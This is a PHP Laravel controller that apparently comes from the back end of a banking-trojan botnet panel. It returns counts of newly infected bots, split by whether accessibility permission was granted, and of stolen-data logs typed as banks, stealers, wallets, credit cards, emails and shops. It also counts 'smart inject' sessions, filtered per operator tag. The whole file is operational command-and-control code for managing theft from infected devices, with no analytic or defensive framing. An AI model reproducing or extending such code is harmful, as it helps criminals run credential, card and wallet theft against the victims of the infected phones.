<?php

namespace App\Http\Controllers\Api\v1;

use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Models\Bot;
use App\Models\BotLog;
use App\Models\InjectionSession;
use App\Models\User;

class CountController extends Controller
{
    public function index(): ApiResponse
    {
        /** @var User $user */
        $user = auth()->user();

        $bots = Bot::where('created_at', '>', $user->entitiesTimestamps->bots ?? $user->created_at->toDateTimeString())
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('tag', $user->tagsNames);
            })
            ->count();

        $permissionlessBots = Bot::where('created_at', '>', $user->entitiesTimestamps->permissionless_bots ?? $user->created_at->toDateTimeString())
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "false"')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('tag', $user->tagsNames);
            })->count();

        $bots_logs = BotLog::join('bots', 'bot_logs.bot_id', '=', 'bots.id')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('bots.tag', $user->tagsNames);
            });

        $banks = (clone $bots_logs)
            ->where('type', 'banks')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->banks ?? $user->created_at->toDateTimeString())
            ->count();

        $stealers = (clone $bots_logs)
            ->where('type', 'stealers')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->stealers ?? $user->created_at->toDateTimeString())
            ->count();

        $crypt = (clone $bots_logs)
            ->where('type', 'crypt')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->crypt ?? $user->created_at->toDateTimeString())
            ->count();

        $shops = (clone $bots_logs)
            ->where('type', 'shops')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->shops ?? $user->created_at->toDateTimeString())
            ->count();

        $emails = (clone $bots_logs)
            ->where('type', 'emails')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->emails ?? $user->created_at->toDateTimeString())
            ->count();

        $wallets = (clone $bots_logs)
            ->where('type', 'wallets')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->wallets ?? $user->created_at->toDateTimeString())
            ->count();

        $creditCards = (clone $bots_logs)
            ->where('type', 'credit_cards')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->credit_cards ?? $user->created_at->toDateTimeString())
            ->count();

        $events = (clone $bots_logs)
            ->limit(20)
            ->selectRaw(1)
            ->where('type', 'events')
            ->where('bot_logs.created_at', '>', $user->entitiesTimestamps->events ?? $user->created_at->toDateTimeString())
            ->get()->count();

        $smartInjects = InjectionSession::join('bots', 'injection_sessions.bot_id', '=', 'bots.id')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('bots.tag', $user->tagsNames);
            })
            ->where('injection_sessions.created_at', '>', $user->entitiesTimestamps->smart_injections ?? $user->created_at->toDateTimeString())
            ->count();

        $counts = [
            'bots' => $bots + $permissionlessBots,
            'permissionless_bots' => $permissionlessBots,
            'banks' => $banks,
            'stealers' => $stealers,
            'crypt' => $crypt,
            'shops' => $shops,
            'emails' => $emails,
            'wallets' => $wallets,
            'credit_cards' => $creditCards,
            'events' => $events,
            'smart_injects' => $smartInjects,
        ];

        return ApiResponse::success($counts);
    }
}
